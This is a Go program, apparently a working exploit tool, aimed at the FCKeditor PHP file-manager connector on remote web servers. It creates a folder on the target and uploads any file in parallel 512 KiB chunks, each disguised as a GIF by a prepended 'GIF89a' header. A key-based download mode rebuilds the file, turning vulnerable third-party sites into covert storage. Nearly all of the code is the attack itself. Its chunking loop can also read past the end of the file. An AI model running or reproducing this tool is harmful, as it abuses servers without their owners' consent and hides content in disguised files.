package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/cheggaaa/pb/v3"
	"github.com/google/uuid"
)

const (
	connector string = "fckeditor/editor/filemanager/connectors/php/connector.php?Type=Media&CurrentFolder="
	newFolder        = "&Command=CreateFolder&NewFolderName="
	upload           = "&Command=FileUpload"
	handle           = "userfiles/media/"
)

const barTemplate string = `{{ bar . "[" "O" (cycle . "." "o" "O" "0" ) " " "]"}} {{percent .}} {{string . "statement" | green}}`
const threads int64 = 8

var uri, key, endpoint string

type Meta struct {
	Name   string `json:"name"`
	Chunks int64  `json:"chunks"`
}

func uploadChunk(Chunk []byte, result chan<- error, i ...int64) {
	client := &http.Client{}
	b := &bytes.Buffer{}
	w := multipart.NewWriter(b)
	req := &http.Request{}
	r := &http.Response{}
	var p io.Writer
	var err error

	if len(i) == 0 {
		p, err = w.CreateFormFile("NewFile", fmt.Sprintf("%s.gif", key))
	} else {
		p, err = w.CreateFormFile("NewFile", fmt.Sprintf("%s_%d.gif", key, i[0]))
	}
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Fprintf(p, "GIF89a;\n")
	p.Write(Chunk)
	w.Close()

	if req, err = http.NewRequest("POST", uri, b); err != nil {
		result <- err
	}
	req.Header.Add("Content-Type", w.FormDataContentType())

	if r, err = client.Do(req); err != nil {
		result <- err
	}
	defer r.Body.Close()

	if _, err = io.Copy(b, r.Body); err != nil {
		result <- err
	}
	if !strings.Contains(b.String(), ".gif") {
		result <- errors.New("Endpoint returned negative response")
	}
	result <- nil
}

func main() {
	get := flag.Bool("get", false, "Retrieve file by supplying key")
	flag.StringVar(&endpoint, "u", "127.0.0.1", "Endpoint URI to exploit")
	flag.Parse()
	endpoint = fmt.Sprintf("https://%s/", endpoint)
	args := flag.Args()
	if len(args) != 1 {
		log.Fatalln("A filepath or a key (for retrieval) must be supplied")
	}
	if *get {
		key = args[0]
		branch := fmt.Sprintf("%s%s%s/", endpoint, handle, key)
		r, err := http.Get(fmt.Sprintf("%s%s.gif", branch, key))
		if err != nil {
			log.Fatalln(err)
		}
		defer r.Body.Close()
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Fatalln(err)
		}
		metadata := &Meta{}
		if err := json.Unmarshal(body[8:], metadata); err != nil {
			log.Fatalln("Found invalid JSON for metadata. Check the supplied key and retry.")
		}
		bar := pb.ProgressBarTemplate(barTemplate).Start64(metadata.Chunks)
		bar.Set("statement", fmt.Sprintf("downloading %s", metadata.Name))
		OutFile, err := os.Create(metadata.Name)
		if err != nil {
			log.Fatalln(err)
		}
		defer OutFile.Close()
		var i int64
		for ; i < metadata.Chunks; i++ {
			r, err := http.Get(fmt.Sprintf("%s%s_%d.gif", branch, key, i))
			if err != nil {
				log.Fatalln(err)
			}
			defer r.Body.Close()
			io.CopyN(io.Discard, r.Body, 8)
			io.Copy(OutFile, r.Body)
			bar.Increment()
		}
		bar.Finish()
	} else {
		key := uuid.New().String()
		branch := fmt.Sprintf("%s%s", endpoint, connector)
		http.Get(fmt.Sprintf("%s%s%s", branch, newFolder, key))
		uri = fmt.Sprintf("%s%s%s", branch, key, upload)
		wait := make(chan error)
		File, err := os.Open(args[0])
		if err != nil {
			log.Fatalln(err)
		}
		defer File.Close()

		stat, err := File.Stat()
		if err != nil {
			log.Fatalln(err)
		}

		// We'll divide the file into 512KiB chunks
		metadata := Meta{filepath.Base(args[0]), 1 + stat.Size()>>19}
		bar := pb.ProgressBarTemplate(barTemplate).Start64(metadata.Chunks + 1)
		bar.Set("statement", fmt.Sprintf("uploading %s", metadata.Name))

		Marshaled, err := json.Marshal(&metadata)
		if err != nil {
			log.Fatalln(err)
		}
		FileContent, err := ioutil.ReadAll(File)
		if err != nil {
			log.Fatalln(err)
		}
		go uploadChunk(Marshaled, wait)
		if err := <-wait; err != nil {
			log.Fatalln(err)
		}
		var i int64
		for ; i < metadata.Chunks-1; i += threads {
			for j := int64(0); j < threads; j++ {
				go uploadChunk(FileContent[(i+j)<<19:(i+j+1)<<19], wait, i+j)
			}
			for j := int64(0); j < threads; j++ {
				if err := <-wait; err != nil {
					log.Fatalln(err)
				}
				bar.Increment()
			}
		}
		go uploadChunk(FileContent[i<<19:], wait, i)
		if err := <-wait; err != nil {
			log.Fatalln(err)
		}
		bar.Finish()
		fmt.Printf("Key: %s\n", key)
	}
}
